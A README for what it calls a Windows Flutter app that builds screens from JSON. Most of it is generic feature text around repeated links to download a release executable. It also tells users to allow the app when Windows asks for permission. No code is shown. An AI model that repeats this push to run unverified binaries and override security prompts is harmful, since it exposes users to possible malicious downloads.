# 🧩 flutter-server-driven-ui - Build screens from JSON

[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases)

## 🖥️ What this app does

flutter-server-driven-ui is a Windows app built with Flutter and Dart. It shows screens that come from JSON data instead of fixed app code. That means the app can change what it shows based on data from a local file or a REST API.

It is built for people who want a simple way to run a UI that is described in JSON. You do not need to set up a development environment to use the released app.

## 📦 Download the app

Visit this page to download the Windows release:

[Download the latest release](https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases)

After you open the release page:

1. Find the latest version
2. Download the Windows file
3. Save it to your PC
4. Open the file to start the app

If your browser saves the file in Downloads, open that folder and double-click the file there.

## 🪟 Windows setup

This app is meant for Windows computers.

Before you run it, check these basics:

- Windows 10 or Windows 11
- A standard desktop or laptop
- Enough space for the app files
- A network connection if you plan to load data from a REST API

If the app opens in a compressed folder, extract the files first. Then run the main app file from the extracted folder.

## ▶️ Run the app

1. Download the release from the link above
2. Open the downloaded file or folder
3. Run the app file
4. Wait for the first screen to load
5. Use the app as shown by the JSON contract or local data source

If Windows asks for permission, choose the option to allow the app to run.

## 🧠 How it works

This app uses a server-driven UI model.

In simple terms:

- JSON controls the screen layout
- The app reads those JSON rules at runtime
- The widget tree is built while the app runs
- Navigation comes from the same JSON source
- Data can come from local assets or a REST API

This setup lets the same app show different screens without changing the core code for each view.

## ✨ Main features

- JSON-based screen definitions
- Dynamic layout creation at runtime
- Support for navigation rules in JSON
- Local asset data support
- REST API data source support
- Flutter and Dart app structure
- UI built from contracts instead of fixed views
- Works well for content that changes often

## 🗂️ Typical app flow

A normal run may follow this flow:

1. The app starts
2. It loads a JSON contract
3. It reads layout and screen data
4. It builds the visible widgets
5. It shows navigation based on the contract
6. It loads content from local files or an API

This flow keeps the app flexible and easy to update through data changes.

## 🔧 Data sources

The app can use two common data sources.

### Local assets

Use local assets when the data should stay inside the app package. This fits:

- Demo content
- Offline use
- Static screen layouts
- Testing screen changes

### REST API

Use a REST API when the screen data should come from a remote service. This fits:

- Content that changes often
- Live data
- Central control of screens
- Shared data for many users

The app can read both styles of input and build the UI from the same kind of contract.

## 📁 File and screen design

The project focuses on a contract-first setup. That means the JSON defines:

- What screen to show
- How the screen is laid out
- What text and media to use
- Which controls appear
- Where each action should go

This makes the app useful when you want a UI that can change without a full app rewrite.

## 🧭 Navigation

Navigation also comes from the JSON contract.

That can include:

- Moving from one screen to another
- Opening a detail view
- Returning to a previous screen
- Switching based on a button tap
- Loading a new view from a remote response

This keeps the app flow tied to the same data source that drives the layout.

## 🧪 Common use cases

This app fits projects like:

- Admin panels
- Content dashboards
- Product catalogs
- Training screens
- Demo apps
- Internal tools
- Forms and guided screens
- Apps that use remote screen rules

It is a strong fit when screen structure changes often and you want those changes to come from JSON.

## 📋 What you may need

To use the released app on Windows, keep these items ready:

- A Windows PC
- The release file from GitHub
- A file extractor if the download comes as a zip file
- Access to the local JSON files or API endpoint used by the app
- Internet access if the app must call a remote REST API

## 🧰 Basic startup steps

1. Go to the releases page
2. Download the newest Windows release
3. Open the downloaded file
4. Extract it if needed
5. Run the main app file
6. Load your JSON contract or API data
7. Check that the first screen appears as expected

If the screen stays blank, check the JSON path, local files, or API URL used by the app

## 🔍 Project topics

This repository covers these areas:

- API
- App design
- Architecture
- Dart
- Flutter
- JSON
- Layout
- REST
- REST API
- Screens
- UI

These topics reflect the app’s focus on data-driven screens and runtime UI building.

## 🧩 Why this structure helps

A server-driven UI can make app changes easier to manage.

It helps when you want to:

- Change screens from data
- Reuse the same app shell
- Reduce hardcoded views
- Keep layout rules in one place
- Load content from different sources

This setup gives you more control over the screen without rebuilding the whole interface each time

## 📌 Release download

Use this page to get the Windows app:

[https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases](https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases)

Download the latest file from that page, then run it on your Windows PC